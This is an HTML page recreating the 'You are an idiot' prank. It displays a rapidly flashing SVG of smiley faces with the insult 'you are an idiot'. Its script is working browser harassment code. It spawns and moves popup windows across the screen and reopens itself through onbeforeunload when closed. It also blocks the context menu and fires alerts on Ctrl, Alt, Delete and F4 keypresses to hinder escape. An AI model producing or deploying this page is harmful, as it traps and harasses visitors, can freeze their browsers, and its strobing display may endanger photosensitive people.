<!DOCTYPE html>
<html lang='en'>

<head>
    <title>Are you an idiot?</title>
    <style>
        html,
        body,
        svg {
            display: none;
            margin: 0;
            height: 100%;
            width: 100%;
        }
    </style>
</head>

<body>
    <svg viewBox='0 0 16000 12000'>
        <g>
            <g style='fill: none; stroke-width: 125'>
                <path
                    d='M15938 11938 L62 11938 62 62 15938 62Z M4150 8130 Q4100 8210 4030 8280 3810 8500 3500 8500 3190 8500 2970 8280 2900 8210 2850 8130 M8650 8130 Q8600 8210 8530 8280 8310 8500 8000 8500 7690 8500 7470 8280 7400 8210 7350 8130 M13150 8130 Q13100 8210 13030 8280 12810 8500 12500 8500 12190 8500 11970 8280 11900 8210 11850 8130'
                    stroke-linecap='round' stroke-linejoin='round'>
                    <animate attributeName='fill' calcMode='discrete' dur='857ms' keyTimes='0;0.5'
                        repeatCount='indefinite' values='black;white' />
                </path>
                <circle cx='3500' cy='7850' r='1000' />
                <circle cx='8000' cy='7850' r='1000' />
                <circle cx='12500' cy='7850' r='1000' />
                <animate attributeName='stroke' calcMode='discrete' dur='857ms' keyTimes='0;0.5'
                    repeatCount='indefinite' values='white;black' />
            </g>
            <g style='fill: black; stroke: white'>
                <circle cx='3225' cy='7515' r='195' />
                <circle cx='3775' cy='7515' r='195' />
                <circle cx='7725' cy='7515' r='195' />
                <circle cx='8275' cy='7515' r='195' />
                <circle cx='12225' cy='7515' r='195' />
                <circle cx='12775' cy='7515' r='195' />
                <animate attributeName='stroke-width' calcMode='discrete' dur='857ms' keyTimes='0;0.5'
                    repeatCount='indefinite' values='125;0' />
            </g>
            <text font-family='Times New Roman' font-size='1820' dominant-baseline='middle' text-anchor='middle' x='50%'
                y='4950'>
                you are an idiot
                <animate attributeName='fill' calcMode='discrete' dur='857ms' keyTimes='0;0.5' repeatCount='indefinite'
                    values='white;black' />
            </text>
        </g>
    </svg>

    <script>
        let dx;
        let dy;
        let xPos = screenX;
        let yPos = screenY;
        valid_state = false;
        const size_str = 'width=360,height=350';

        const reflect = (n, m) => m - ((n % m) + m) % m;

        const bounce = (b) => {
            xPos += dx;
            yPos += dy;
            const width = screen.width - outerWidth;
            const height = screen.height - outerHeight;
            if (xPos < 0 || xPos > width) {
                const speed = 5 * Math.random() + 5;
                dx = dx > 0 ? -speed : speed;
                xPos = reflect(xPos, width);
                b |= 1;
            }
            if (yPos < 0 || yPos > height) {
                const speed = 5 * Math.random() + 5;
                dy = dy > 0 ? -speed : speed;
                yPos = reflect(yPos, height);
                b |= 2;
            }
            if ((b & 1 ^ (b >> 1)) && Math.random() < 0.25) open(location.href, '', `${size_str},top=${yPos},left=${xPos}`);
            moveTo(xPos, yPos);
            setTimeout(bounce, 1, 0);
        }

        const init = () => {
            valid_state = true;
            document.querySelector('html').style.display = 'block';
            document.querySelector('body').style.display = 'block';
            document.querySelector('svg').style.display = 'block';
            document.title = 'You are an idiot!';
        }

        onbeforeunload = function () {
            if (valid_state) {
                open(location.href, '', `${size_str},top=${yPos},left=${xPos}`);
                return 'Are you an idiot?';
            }
        };

        oncontextmenu = () => false;

        onkeydown = function () {
            if (valid_state) {
                const keyCode = event.keyCode;
                if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) alert('You are an idiot!');
            }
        }

        if (opener?.valid_state) {
            init();
            dx = 5 * Math.random() + 5;
            if (Math.random() < 0.5) dx *= -1;
            dy = 5 * Math.random() + 5;
            if (Math.random() < 0.5) dy *= -1;
            bounce(3);
        } else {
            const popup = open();
            if (!popup) alert('Please reload with popups unblocked');
            else {
                popup.close();
                init();
                open(location.href, '', size_str);
            }
        }
    </script>
</body>

</html>